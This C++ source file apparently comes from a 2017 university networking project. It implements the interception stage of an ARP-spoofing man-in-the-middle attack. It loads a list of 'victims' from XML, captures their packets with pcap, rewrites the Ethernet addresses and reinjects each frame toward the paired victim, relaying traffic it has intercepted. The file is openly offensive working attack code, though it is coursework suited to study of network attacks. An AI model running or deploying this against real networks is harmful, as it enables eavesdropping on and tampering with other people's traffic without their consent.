//
//  pds-intercept.cpp
//  pds-project
//
//  Created by Jordán Jarolím on 22.04.17.
//  Copyright © 2017 FIT VUTBR. All rights reserved.
//

#include "pds-intercept.hpp"
#include "pds-scanner.hpp"
#include "pds-spoof.hpp"
#include "types.h"



using namespace std;
pcap_t *recieveSend = NULL;
/**
 * pcal_loop handler
 */
void handler(unsigned char *user, const struct pcap_pkthdr *pkthdr, const unsigned char *packet)
{
    ((PdsIntercept *)user)->forwardTraffic(pkthdr, packet);
}

/**
 * Catch all traffic and analyze it through handler
 */
void PdsIntercept::catchTraffic(PdsScanner* scanner){
    
    this->victims = ManipulateXml::readVictims(PdsScanner::filename);
    
    for(int i=0; i<victims.size(); ++i)
        std::cout << victims[i].ip << ' '<< victims[i].mac<< ' '<< victims[i].group<<"\n";
    
    char error_buffer[PCAP_ERRBUF_SIZE] = "\0";
    recieveSend = pcap_open_live(scanner->interface.c_str(), sizeof(struct ether_header) + sizeof(struct ether_arp), true, 0, error_buffer);
    pcap_loop(recieveSend , -1 , handler , reinterpret_cast<u_char*>(this));
    pcap_close(recieveSend);
}

/**
 * Forward traffic if necessary
 */
void PdsIntercept::forwardTraffic(const struct pcap_pkthdr *header, const u_char *packet){
    ether_header ethernetHeader, newHeader;
    unsigned char packetHeader[header->len];
    unsigned char byteSenderMac[6];
    unsigned char byteRecMac[6];
    string victimsId = "";
    string senderMac = "";
    string senderIp = "";
    string recMac = "";
    string recIp = "";
    bool forward = false;
    
    /* Get ether header */
    memcpy(&ethernetHeader, packet, sizeof(ether_header));
    
    /* Get pcap_pkthdr */
    memcpy(packetHeader, packet, header->len);
    
    /* get src mac */
    char srcMacStr[18] = "\0";
    for (int i = 0; i < 6; i++) {
        sprintf(srcMacStr + strlen(srcMacStr), "%02x%s", ethernetHeader.ether_shost[i], (i % 2 == 1 && i < 5) ? ":" : "");
    }
    
    for (int i = 0; i < (this->victims).size(); i++) {
        if (!this->victims[i].mac.compare(srcMacStr)) {
            victimsId = this->victims[i].group;
            senderIp = this->victims[i].ip;
            senderMac = this->victims[i].mac;
            forward = true;
        }
    }
    
    if (forward){
        forward = false;
        for (int i = 0; i < (this->victims).size(); i++) {
            if (!(this->victims[i].group).compare(victimsId) && (this->victims[i].mac).compare(senderMac)) {
                recIp = this->victims[i].ip;
                recMac = this->victims[i].mac;
                forward = true;
            }
        }
    }

    if (forward){
        cout<<"sender ip: "<<senderIp<<" sender mac: "<< senderMac << "\nrec ip: "<<recIp<<" rec mac: "<<recMac<<"\n";

        Packet* helper = new Packet;
        helper->simplifyMac(recMac, byteRecMac);
        helper->simplifyMac(senderMac, byteSenderMac);
        delete helper;
        
        newHeader.ether_type = ethernetHeader.ether_type;
        memcpy(newHeader.ether_dhost, byteRecMac, ETH_ALEN);
        memcpy(newHeader.ether_shost, byteSenderMac, ETH_ALEN);
    
        memcpy(packetHeader, &newHeader, sizeof(ether_header));
        char error_buffer[PCAP_ERRBUF_SIZE] = "\0";
        
        if (pcap_inject(recieveSend, packetHeader, header->len) < 0) {
            pcap_perror(recieveSend, 0);
            pcap_close(recieveSend);
            exit(EXIT_FAILURE);
        }
    }
}
